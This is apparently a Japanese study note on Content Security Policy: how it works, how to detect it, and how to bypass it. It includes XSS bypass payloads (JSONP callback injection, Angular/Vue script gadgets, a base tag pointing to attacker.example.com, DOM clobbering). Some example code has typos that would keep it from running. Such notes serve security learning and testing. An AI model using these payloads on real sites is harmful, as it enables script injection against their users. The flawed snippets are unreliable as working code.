# CSP Evaluation
<br>

- [\#CSPとは](#CSPとは)
- [\#CSPが設定されているか](#CSPが設定されているか)
	- [\#HTTPヘッダに含まれる場合](#HTTPヘッダに含まれる場合)
	- [\#meta要素で記述する場合](#meta要素で記述する場合)
- [\#ディレクティブ](#ディレクティブ)
- [\#CSPとは](#CSPとは)
- [\#Bypassing](#Bypassing)
	- [\#ホストベースの構成を利用したバイパス](#ホストベースの構成を利用したバイパス)
	- [\#ディレクティブの設定不備により脆弱性が生まれるパターン](#ディレクティブの設定不備により脆弱性が生まれるパターン)
	- [\#DOM Clobbering による strict-dynamic のバイパス](#DOM-Clobbering-による-strict-dynamic-のバイパス)

<br>

## CSPとは
CSP(Content Security Policy)

CSPはXSSなどの*Content Injection攻撃*に対するリスクを軽減させるセキュリティレイヤーのこと。

具体的には

- ホスト名
	- スクリプトの配信元として信頼するサーバーのホスト名を指定する。スクリプトを読み込む際に参照されて信頼できるものとして含まれていない場合は実行しない。
- ハッシュ値
	- 実効するスクリプトのハッシュ値を先に計算しておき、そのハッシュ値と同じ場合のみ実行を許可する。
	- hash値が異なる場合 -> script が書き換わった場合実行しない
- 乱数
	- HTMLをレスポンス時に使い捨ての乱数スクリプトに付与し、付与時の乱数と等しい場合のみ実行する。
	- nonce 属性がついていない script 要素は実行しない

<br>

## CSPが設定されているか

CSPが設定されているかは以下の2パターンで確認できる。

### HTTPヘッダに含まれる場合
```http
HTTP/1.1 200 OK
Host: example.com
...
Content-Security-Policy: script-src 'self'
...
```

### meta要素で記述する場合
```html
<head>
	<meta 
		http-equiv="Content-Security-Policy" 
		content="script-src 'self'"
	>
</head>
```

<br>


## ディレクティブ
ディレクティブとは、CSPによる制限を定義するための命令記法のこと。
*\<directive-name\> \<directive-value\> ...* の順で書かれる
For exsample)
```directive
script-src 'self'
script-src 'self' 'unsafe-inline'
```

<!--
**script-srs** : スクリプトに関する制限を定義するディレクティブ。
|keyword|説明|
|---|---|
|'none'|あらゆるスクリプト|
|'self'|参照している HTML と Same-Origin であるスクリプトの実行を許可する|
|*host-source:* |ホスト名や IP アドレス、URLによって指定されたサーバーから配信されるスクリプトの実行を許可する。|
|'host-souce' 'nonce-\<base64-value\>'|Base64 形式の Nonce (使い捨ての乱数) を用いてスクリプトの実行を許可する。許可対象とするスクリプト要素の nonce 属性と同じ値にならない場合、そのスクリプトは実行されない。|
|'host-souce' '\<hash-algorithm\>-\<base64-value\>'|Base64形式のハッシュ値を用いてスクリプトの実行を許可する。ハッシュ値はスクリプトの内容をハッシュ化したもの。外部リソースの場合はスクリプトの integrity 属性にそのスクリプトのハッシュ値を入れる。|
|
**connect-src** : script interfaces API (XMLHttpRequest や Fetch API のこと) を介して通信可能なURLの制限を定義するディレクティブ。connect-src ディレクティブの値として指定されたURL以外のアクセスは禁止される。

**default-src** : Fetch Directives に属するディレクティブのフォールバックとして機能する。
[developer.mozilla.org CSP: default-src](https://developer.mozilla.org/ja/docs/Web/HTTP/Headers/Content-Security-Policy/default-src)

**base-uri** : base要素で可能なドキュメントの相対URLの起点を制限するディレクティブ。**none** なら安全

-->

<br>

## Bypassing

### ホストベースの構成を利用したバイパス
---
```http
Content-Security-Policy: script-src 'self' csp.example.com
```
のようになっている場合
以下の２点をチェックする

**JSONPエンドポイントの有無**

> *csp.example.com* からスクリプトを返させることによって SOP(Same-Origin-Policy) の制限をバイパスする。

Attacker -> Target
```html
<script src="csp.example.com/jsonp?callback=alert(1)//"></script>
```

Target -> csp.example.com
```text
csp.example.com/jsonp?callback=alert(1)//
#通常 callback 関数を要求していますが、今回はalertが渡されている
```

csp.example.com -> Target
```javascript
alert(1)//({name:aaaa})
// "alert(1)//" に引数を付けて返すがコメントアウトされ alert(1) が実行される
```


**サーバのライブラリ**

> ライブラリに含まれる Script Gadget と呼ばれるスクリプトの挿入を可能にするスクリプトを利用する。

Angular.js の場合
```html
<script src="csp.example.com/angular.js"></script>
<div ng-app ng-csp>{{ eval.constructor('alert(1)')() }}</div>
```

Vue.js の場合
```html
<script src="cdn.example.com/vue.js"></script>
<div>{{ constructor.constructor('alert(1)')() }}</div>
```


<br>


### ディレクティブの設定不備により脆弱性が生まれるパターン
---

> 設定の不備については
[CSP Evaluator](https://csp-evaluator.withgoogle.com/)にて脆弱性を確認できる。

**base-uri** 設定不備の際
```html
<base href="http://attacker.example.com">
```
とすることでそれ以下の\<script src="/test.js"\>となっている箇所を
http://attacker.example.com/test.js と参照先を変えることが可能

<br>

### DOM Clobbering による strict-dynamic のバイパス

---
> script-src ディレクティブに strict-dynamic が設定されている場合、DOM Clobbering と呼ばれる手法を用いて CSP をバイパスできる場合がある。
> > **strict-dynamic** : parser-incerted (\<img src="/"  onerror="\<script\>alert(1)\</script>"\>) などを防ぐ設定
> > 
> > **DOM Clobbering** とは、HTML 内に不正な HTML を挿入することで本来の DOM 構造を破壊し、JavaScrip による DOM 操作の内容を強制的に変更させる手法のこと。

**DOM Clobbering**

*document.getElementById('name')* などが存在するときは、
もともとの idの値よりも前の段階で そのidの値 を使用することで DOM 構造を破壊できる。




脆弱性)

*?title=TITLE&name=USER*
```html
<script>
	windows.onload = () {
		const name = (new URL(location).searchParams).get('name');
		document.getElemetById('name').intterHTML = name;
	}
</script>

<!-- タイトル
?title=TITLE から取得
-->
<h1>TITLE</h1>
<!-- 名前 -->
<p id="name"></p>
```


攻撃例)

*?title=\</h1\>\<script id="name"\>\</script\>\<h1\>&name=alert(1)//*
```html
<script>
	windows.onload = () {
		const name = (new URL(location).searchParams).get('name');
		document.getElemetById('name').intterHTML = name;
	}
</script>

<!-- タイトル
?title=</h1><script id="name"></script><h1> から取得
-->
<h1></h1><script id="name"></script><h1>
<!-- 名前 -->
<p id="name"></p>
```